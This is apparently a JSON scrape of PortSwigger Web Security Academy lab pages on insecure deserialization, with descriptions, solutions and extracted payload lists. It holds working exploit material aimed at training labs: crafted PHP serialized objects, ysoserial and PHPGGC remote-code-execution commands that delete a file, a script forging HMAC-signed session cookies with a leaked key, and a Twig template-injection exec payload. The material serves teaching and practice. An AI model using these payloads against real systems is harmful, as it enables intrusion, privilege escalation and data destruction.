[
  {
    "url": "https://portswigger.net/web-security/deserialization/exploiting/lab-deserialization-arbitrary-object-injection-in-php",
    "category": "deserialization",
    "title": "Arbitrary object injection in PHP",
    "description": "This lab uses a serialization-based session mechanism and is vulnerable to arbitrary object injection as a result. To solve the lab, create and inject a malicious serialized object to delete themorale.txtfile from Carlos's home directory. You will need to obtain source code access to solve this lab.",
    "solution": "You can sometimes read source code by appending a tilde (\n~)\nto a filename to retrieve an editor-generated backup file.",
    "payloads": [
      "morale.txt",
      "wiener:peter",
      "/libs/CustomTemplate.php",
      "CustomTemplate",
      "__destruct()",
      "unlink()",
      "lock_file_path",
      "/home/carlos/morale.txt",
      "O:14:\"CustomTemplate\":1:{s:14:\"lock_file_path\";s:23:\"/home/carlos/morale.txt\";}"
    ]
  },
  {
    "url": "https://portswigger.net/web-security/deserialization/exploiting/lab-deserialization-developing-a-custom-gadget-chain-for-java-deserialization",
    "category": "deserialization",
    "title": "Developing a custom gadget chain for Java deserialization",
    "description": "This lab uses a serialization-based session mechanism. If you can construct a suitable gadget chain, you can exploit this lab's insecure deserialization to obtain the administrator's password.",
    "solution": "To save you some of the effort, we've provided a\ngeneric Java program for serializing objects\n. You can adapt this to generate a suitable object for your exploit. If you don't already have a Java environment set up, you can compile and execute the program using a browser-based IDE, such as\nrepl.it\n.",
    "payloads": [
      "administrator",
      "carlos",
      "wiener:peter",
      "repl.it",
      "/backup/AccessTokenUser.java",
      "/backup",
      "ProductTemplate.java",
      "ProductTemplate.readObject()",
      "ProductTemplate",
      "\"your-payload-here\"",
      "Main.java",
      "PEBiYXNlNjRfND6s7QAFc3IAI2RhdGEucHJvZHVjdGNhdGFsb2cuUHJvZHVjdFRlbXBsYXRlAAAAAAAAAAECAAFMAAJpZHQAEkxqYXZhL2xhbmcvU3RyaW5nO3hwdAA8QGZyb21fY2hhcmNvZGVfMz48QGdldF9sZW4gLz48QC9mcm9tX2NoYXJjb2RlXzM+WU9VUi1QQVlMT0FELUhFUkU8QHNldF9sZW4+PEBsZW5ndGhfMD5ZT1VSLVBBWUxPQUQtSEVSRTxAL2xlbmd0aF8wPjxAL3NldF9sZW4+PEAvYmFzZTY0XzQ+",
      "<@base64>\u00ac\u00edsr#data.productcatalog.ProductTemplateLidtLjava/lang/String;xpt<@from_charcode><@get_len /></@from_charcode>YOUR-PAYLOAD-HERE<@set_len><@length>YOUR-PAYLOAD-HERE</@length></@set_len></@base64>",
      "YOUR-PAYLOAD-HERE",
      "UNION"
    ]
  },
  {
    "url": "https://portswigger.net/web-security/deserialization/exploiting/lab-deserialization-developing-a-custom-gadget-chain-for-php-deserialization",
    "category": "deserialization",
    "title": "Developing a custom gadget chain for PHP deserialization",
    "description": "This lab uses a serialization-based session mechanism. By deploying a custom gadget chain, you can exploit its insecure deserialization to achieve remote code execution. To solve the lab, delete themorale.txtfile from Carlos's home directory.",
    "solution": "You can sometimes read source code by appending a tilde (\n~\n) to a filename to retrieve an editor-generated backup file.",
    "payloads": [
      "morale.txt",
      "wiener:peter",
      "/cgi-bin/libs/CustomTemplate.php",
      ".php~",
      "__wakeup()",
      "CustomTemplate",
      "Product",
      "default_desc_type",
      "desc",
      "DefaultMap",
      "__get()",
      "call_user_func()",
      "DefaultMap->callback",
      "$name",
      "exec(rm /home/carlos/morale.txt)"
    ]
  },
  {
    "url": "https://portswigger.net/web-security/deserialization/exploiting/lab-deserialization-exploiting-java-deserialization-with-apache-commons",
    "category": "deserialization",
    "title": "Exploiting Java deserialization with Apache Commons",
    "description": "This lab uses a serialization-based session mechanism and loads the Apache Commons Collections library. Although you don't have source code access, you can still exploit this lab using pre-built gadget chains.",
    "solution": "In Java versions 16 and above, you need to set a series of command-line arguments for Java to run ysoserial. For example:\njava -jar ysoserial-all.jar \\\n   --add-opens=java.xml/com.sun.org.apache.xalan.internal.xsltc.trax=ALL-UNNAMED \\\n   --add-opens=java.xml/com.sun.org.apache.xalan.internal.xsltc.runtime=ALL-UNNAMED \\\n   --add-opens=java.base/java.net=ALL-UNNAMED \\\n   --add-opens=java.base/java.util=ALL-UNNAMED \\\n   [payload] '[command]'",
    "payloads": [
      "morale.txt",
      "wiener:peter",
      "java -jar ysoserial-all.jar \\\n   --add-opens=java.xml/com.sun.org.apache.xalan.internal.xsltc.trax=ALL-UNNAMED \\\n   --add-opens=java.xml/com.sun.org.apache.xalan.internal.xsltc.runtime=ALL-UNNAMED \\\n   --add-opens=java.base/java.net=ALL-UNNAMED \\\n   --add-opens=java.base/java.util=ALL-UNNAMED \\\n   [payload] '[command]'",
      "java -jar ysoserial-all.jar \\\n   --add-opens=java.xml/com.sun.org.apache.xalan.internal.xsltc.trax=ALL-UNNAMED \\\n   --add-opens=java.xml/com.sun.org.apache.xalan.internal.xsltc.runtime=ALL-UNNAMED \\\n   --add-opens=java.base/java.net=ALL-UNNAMED \\\n   --add-opens=java.base/java.util=ALL-UNNAMED \\\n   CommonsCollections4 'rm /home/carlos/morale.txt' | base64",
      "java -jar ysoserial-all.jar CommonsCollections4 'rm /home/carlos/morale.txt' | base64"
    ]
  },
  {
    "url": "https://portswigger.net/web-security/deserialization/exploiting/lab-deserialization-exploiting-php-deserialization-with-a-pre-built-gadget-chain",
    "category": "deserialization",
    "title": "Exploiting PHP deserialization with a pre-built gadget chain",
    "description": "This lab has a serialization-based session mechanism that uses a signed cookie. It also uses a common PHP framework. Although you don't have source code access, you can still exploit this lab's insecure deserialization using pre-built gadget chains.",
    "solution_steps": [
      "Log in and send a request containing your session cookie to Burp Repeater. Highlight the cookie and look at the Inspector panel.",
      "Notice that the cookie contains a Base64-encoded token, signed with a SHA-1 HMAC hash.",
      "Copy the decoded cookie from the Inspector and paste it into Decoder.",
      "In Decoder, highlight the token and then select Decode as > Base64 . Notice that the token is actually a serialized PHP object.",
      "In Burp Repeater, observe that if you try sending a request with a modified cookie, an exception is raised because the digital signature no longer matches. However, you should notice that: A developer comment discloses the location of a debug file at /cgi-bin/phpinfo.php . The error message reveals that the website is using the Symfony 4.3.6 framework.",
      "Request the /cgi-bin/phpinfo.php file in Burp Repeater and observe that it leaks some key information about the website, including the SECRET_KEY environment variable. Save this key; you'll need it to sign your exploit later.",
      "Download the \"PHPGGC\" tool and execute the following command: ./phpggc Symfony/RCE4 exec 'rm /home/carlos/morale.txt' | base64 This will generate a Base64-encoded serialized object that exploits an RCE gadget chain in Symfony to delete Carlos's morale.txt file.",
      "You now need to construct a valid cookie containing this malicious object and sign it correctly using the secret key you obtained earlier. You can use the following PHP script to do this. Before running the script, you just need to make the following changes: Assign the object you generated in PHPGGC to the $object variable. Assign the secret key that you copied from the phpinfo.php file to the $secretKey variable. <?php\n$object = \"OBJECT-GENERATED-BY-PHPGGC\";\n$secretKey = \"LEAKED-SECRET-KEY-FROM-PHPINFO.PHP\";\n$cookie = urlencode('{\"token\":\"' . $object . '\",\"sig_hmac_sha1\":\"' . hash_hmac('sha1', $object, $secretKey) . '\"}');\necho $cookie; This will output a valid, signed cookie to the console.",
      "In Burp Repeater, replace your session cookie with the malicious one you just created, then send the request to solve the lab."
    ],
    "solution": "1. Log in and send a request containing your session cookie to Burp Repeater. Highlight the cookie and look at the Inspector panel.\n2. Notice that the cookie contains a Base64-encoded token, signed with a SHA-1 HMAC hash.\n3. Copy the decoded cookie from the Inspector and paste it into Decoder.\n4. In Decoder, highlight the token and then select Decode as > Base64 . Notice that the token is actually a serialized PHP object.\n5. In Burp Repeater, observe that if you try sending a request with a modified cookie, an exception is raised because the digital signature no longer matches. However, you should notice that: A developer comment discloses the location of a debug file at /cgi-bin/phpinfo.php . The error message reveals that the website is using the Symfony 4.3.6 framework.\n6. Request the /cgi-bin/phpinfo.php file in Burp Repeater and observe that it leaks some key information about the website, including the SECRET_KEY environment variable. Save this key; you'll need it to sign your exploit later.\n7. Download the \"PHPGGC\" tool and execute the following command: ./phpggc Symfony/RCE4 exec 'rm /home/carlos/morale.txt' | base64 This will generate a Base64-encoded serialized object that exploits an RCE gadget chain in Symfony to delete Carlos's morale.txt file.\n8. You now need to construct a valid cookie containing this malicious object and sign it correctly using the secret key you obtained earlier. You can use the following PHP script to do this. Before running the script, you just need to make the following changes: Assign the object you generated in PHPGGC to the $object variable. Assign the secret key that you copied from the phpinfo.php file to the $secretKey variable. <?php\n$object = \"OBJECT-GENERATED-BY-PHPGGC\";\n$secretKey = \"LEAKED-SECRET-KEY-FROM-PHPINFO.PHP\";\n$cookie = urlencode('{\"token\":\"' . $object . '\",\"sig_hmac_sha1\":\"' . hash_hmac('sha1', $object, $secretKey) . '\"}');\necho $cookie; This will output a valid, signed cookie to the console.\n9. In Burp Repeater, replace your session cookie with the malicious one you just created, then send the request to solve the lab.",
    "payloads": [
      "morale.txt",
      "wiener:peter",
      "/cgi-bin/phpinfo.php",
      "SECRET_KEY",
      "./phpggc Symfony/RCE4 exec 'rm /home/carlos/morale.txt' | base64",
      "$object",
      "phpinfo.php",
      "$secretKey",
      "<?php\n$object = \"OBJECT-GENERATED-BY-PHPGGC\";\n$secretKey = \"LEAKED-SECRET-KEY-FROM-PHPINFO.PHP\";\n$cookie = urlencode('{\"token\":\"' . $object . '\",\"sig_hmac_sha1\":\"' . hash_hmac('sha1', $object, $secretKey) . '\"}');\necho $cookie;"
    ]
  },
  {
    "url": "https://portswigger.net/web-security/deserialization/exploiting/lab-deserialization-exploiting-ruby-deserialization-using-a-documented-gadget-chain",
    "category": "deserialization",
    "title": "Exploiting Ruby deserialization using a documented gadget chain",
    "description": "This lab uses a serialization-based session mechanism and the Ruby on Rails framework. There are documented exploits that enable remote code execution via a gadget chain in this framework.",
    "solution": "Try searching for \"ruby deserialization gadget chain\" online.",
    "payloads": [
      "morale.txt",
      "Universal Deserialisation Gadget for Ruby 2.x-3.x",
      "vakzz",
      "devcraft.io",
      "rm /home/carlos/morale.txt",
      "puts Base64.encode64(payload)"
    ]
  },
  {
    "url": "https://portswigger.net/web-security/deserialization/exploiting/lab-deserialization-modifying-serialized-data-types",
    "category": "deserialization",
    "title": "Modifying serialized data types",
    "description": "This lab uses a serialization-based session mechanism and is vulnerable to authentication bypass as a result. To solve the lab, edit the serialized object in the session cookie to access theadministratoraccount. Then, delete the usercarlos.",
    "solution": "To access another user's account, you will need to exploit a quirk in how PHP compares data of different types.\nNote that PHP's comparison behavior differs between versions. This lab assumes behavior consistent with PHP 7.x and earlier.",
    "payloads": [
      "administrator",
      "carlos",
      "wiener:peter",
      "GET /my-account",
      "username",
      "O:4:\"User\":2:{s:8:\"username\";s:13:\"administrator\";s:12:\"access_token\";i:0;}",
      "/admin",
      "/admin/delete?username=carlos"
    ]
  },
  {
    "url": "https://portswigger.net/web-security/deserialization/exploiting/lab-deserialization-modifying-serialized-objects",
    "category": "deserialization",
    "title": "Modifying serialized objects",
    "description": "This lab uses a serialization-based session mechanism and is vulnerable to privilege escalation as a result. To solve the lab, edit the serialized object in the session cookie to exploit this vulnerability and gain administrative privileges. Then, delete the usercarlos.",
    "solution_steps": [
      "Log in using your own credentials. Notice that the post-login GET /my-account request contains a session cookie that appears to be URL and Base64-encoded.",
      "Use Burp's Inspector panel to study the request in its decoded form. Notice that the cookie is in fact a serialized PHP object. The admin attribute contains b:0 , indicating the boolean value false . Send this request to Burp Repeater.",
      "In Burp Repeater, use the Inspector to examine the cookie again and change the value of the admin attribute to b:1 . Click \"Apply changes\". The modified object will automatically be re-encoded and updated in the request.",
      "Send the request. Notice that the response now contains a link to the admin panel at /admin , indicating that you have accessed the page with admin privileges.",
      "Change the path of your request to /admin and resend it. Notice that the /admin page contains links to delete specific user accounts.",
      "Change the path of your request to /admin/delete?username=carlos and send the request to solve the lab."
    ],
    "solution": "1. Log in using your own credentials. Notice that the post-login GET /my-account request contains a session cookie that appears to be URL and Base64-encoded.\n2. Use Burp's Inspector panel to study the request in its decoded form. Notice that the cookie is in fact a serialized PHP object. The admin attribute contains b:0 , indicating the boolean value false . Send this request to Burp Repeater.\n3. In Burp Repeater, use the Inspector to examine the cookie again and change the value of the admin attribute to b:1 . Click \"Apply changes\". The modified object will automatically be re-encoded and updated in the request.\n4. Send the request. Notice that the response now contains a link to the admin panel at /admin , indicating that you have accessed the page with admin privileges.\n5. Change the path of your request to /admin and resend it. Notice that the /admin page contains links to delete specific user accounts.\n6. Change the path of your request to /admin/delete?username=carlos and send the request to solve the lab.",
    "payloads": [
      "carlos",
      "wiener:peter",
      "GET /my-account",
      "admin",
      "false",
      "/admin",
      "/admin/delete?username=carlos"
    ]
  },
  {
    "url": "https://portswigger.net/web-security/deserialization/exploiting/lab-deserialization-using-application-functionality-to-exploit-insecure-deserialization",
    "category": "deserialization",
    "title": "Using application functionality to exploit insecure deserialization",
    "description": "This lab uses a serialization-based session mechanism. A certain feature invokes a dangerous method on data provided in a serialized object. To solve the lab, edit the serialized object in the session cookie and use it to delete themorale.txtfile from Carlos's home directory.",
    "solution_steps": [
      "Log in to your own account. On the \"My account\" page, notice the option to delete your account by sending a POST request to /my-account/delete .",
      "Send a request containing a session cookie to Burp Repeater.",
      "In Burp Repeater, study the session cookie using the Inspector panel. Notice that the serialized object has an avatar_link attribute, which contains the file path to your avatar.",
      "Edit the serialized data so that the avatar_link points to /home/carlos/morale.txt . Remember to update the length indicator. The modified attribute should look like this: s:11:\"avatar_link\";s:23:\"/home/carlos/morale.txt\"",
      "Click \"Apply changes\". The modified object will automatically be re-encoded and updated in the request.",
      "Change the request line to POST /my-account/delete and send the request. Your account will be deleted, along with Carlos's morale.txt file."
    ],
    "solution": "1. Log in to your own account. On the \"My account\" page, notice the option to delete your account by sending a POST request to /my-account/delete .\n2. Send a request containing a session cookie to Burp Repeater.\n3. In Burp Repeater, study the session cookie using the Inspector panel. Notice that the serialized object has an avatar_link attribute, which contains the file path to your avatar.\n4. Edit the serialized data so that the avatar_link points to /home/carlos/morale.txt . Remember to update the length indicator. The modified attribute should look like this: s:11:\"avatar_link\";s:23:\"/home/carlos/morale.txt\"\n5. Click \"Apply changes\". The modified object will automatically be re-encoded and updated in the request.\n6. Change the request line to POST /my-account/delete and send the request. Your account will be deleted, along with Carlos's morale.txt file.",
    "payloads": [
      "morale.txt",
      "wiener:peter",
      "gregg:rosebud",
      "POST",
      "/my-account/delete",
      "avatar_link",
      "/home/carlos/morale.txt",
      "s:11:\"avatar_link\";s:23:\"/home/carlos/morale.txt\"",
      "POST /my-account/delete"
    ]
  },
  {
    "url": "https://portswigger.net/web-security/deserialization/exploiting/lab-deserialization-using-phar-deserialization-to-deploy-a-custom-gadget-chain",
    "category": "deserialization",
    "title": "Using PHAR deserialization to deploy a custom gadget chain",
    "description": "This lab does not explicitly use deserialization. However, if you combinePHARdeserialization with other advanced hacking techniques, you can still achieve remote code execution via a custom gadget chain.",
    "solution_steps": [
      "Observe that the website has a feature for uploading your own avatar, which only accepts JPG images. Upload a valid JPG as your avatar. Notice that it is loaded using GET /cgi-bin/avatar.php?avatar=wiener .",
      "In Burp Repeater, request GET /cgi-bin to find an index that shows a Blog.php and CustomTemplate.php file. Obtain the source code by requesting the files using the .php~ backup extension.",
      "Study the source code and identify the gadget chain involving the Blog->desc and CustomTemplate->lockFilePath attributes.",
      "Notice that the file_exists() filesystem method is called on the lockFilePath attribute.",
      "Notice that the website uses the Twig template engine. You can use deserialization to pass in an server-side template injection (SSTI) payload. Find a documented SSTI payload for remote code execution on Twig, and adapt it to delete Carlos's file: {{_self.env.registerUndefinedFilterCallback(\"exec\")}}{{_self.env.getFilter(\"rm /home/carlos/morale.txt\")}}",
      "Write a some PHP for creating a CustomTemplate and Blog containing your SSTI payload: class CustomTemplate {}\nclass Blog {}\n$object = new CustomTemplate;\n$blog = new Blog;\n$blog->desc = '{{_self.env.registerUndefinedFilterCallback(\"exec\")}}{{_self.env.getFilter(\"rm /home/carlos/morale.txt\")}}';\n$blog->user = 'user';\n$object->template_file_path = $blog;",
      "Create a PHAR-JPG polyglot containing your PHP script. You can find several scripts for doing this online (search for \" phar jpg polyglot \"). Alternatively, you can download our ready-made one .",
      "Upload this file as your avatar.",
      "In Burp Repeater, modify the request line to deserialize your malicious avatar using a phar:// stream as follows: GET /cgi-bin/avatar.php?avatar=phar://wiener",
      "Send the request to solve the lab."
    ],
    "solution": "1. Observe that the website has a feature for uploading your own avatar, which only accepts JPG images. Upload a valid JPG as your avatar. Notice that it is loaded using GET /cgi-bin/avatar.php?avatar=wiener .\n2. In Burp Repeater, request GET /cgi-bin to find an index that shows a Blog.php and CustomTemplate.php file. Obtain the source code by requesting the files using the .php~ backup extension.\n3. Study the source code and identify the gadget chain involving the Blog->desc and CustomTemplate->lockFilePath attributes.\n4. Notice that the file_exists() filesystem method is called on the lockFilePath attribute.\n5. Notice that the website uses the Twig template engine. You can use deserialization to pass in an server-side template injection (SSTI) payload. Find a documented SSTI payload for remote code execution on Twig, and adapt it to delete Carlos's file: {{_self.env.registerUndefinedFilterCallback(\"exec\")}}{{_self.env.getFilter(\"rm /home/carlos/morale.txt\")}}\n6. Write a some PHP for creating a CustomTemplate and Blog containing your SSTI payload: class CustomTemplate {}\nclass Blog {}\n$object = new CustomTemplate;\n$blog = new Blog;\n$blog->desc = '{{_self.env.registerUndefinedFilterCallback(\"exec\")}}{{_self.env.getFilter(\"rm /home/carlos/morale.txt\")}}';\n$blog->user = 'user';\n$object->template_file_path = $blog;\n7. Create a PHAR-JPG polyglot containing your PHP script. You can find several scripts for doing this online (search for \" phar jpg polyglot \"). Alternatively, you can download our ready-made one .\n8. Upload this file as your avatar.\n9. In Burp Repeater, modify the request line to deserialize your malicious avatar using a phar:// stream as follows: GET /cgi-bin/avatar.php?avatar=phar://wiener\n10. Send the request to solve the lab.",
    "payloads": [
      "PHAR",
      "morale.txt",
      "wiener:peter",
      "GET /cgi-bin/avatar.php?avatar=wiener",
      "GET /cgi-bin",
      "Blog.php",
      "CustomTemplate.php",
      ".php~",
      "Blog->desc",
      "CustomTemplate->lockFilePath",
      "file_exists()",
      "lockFilePath",
      "{{_self.env.registerUndefinedFilterCallback(\"exec\")}}{{_self.env.getFilter(\"rm /home/carlos/morale.txt\")}}",
      "CustomTemplate",
      "Blog"
    ]
  }
]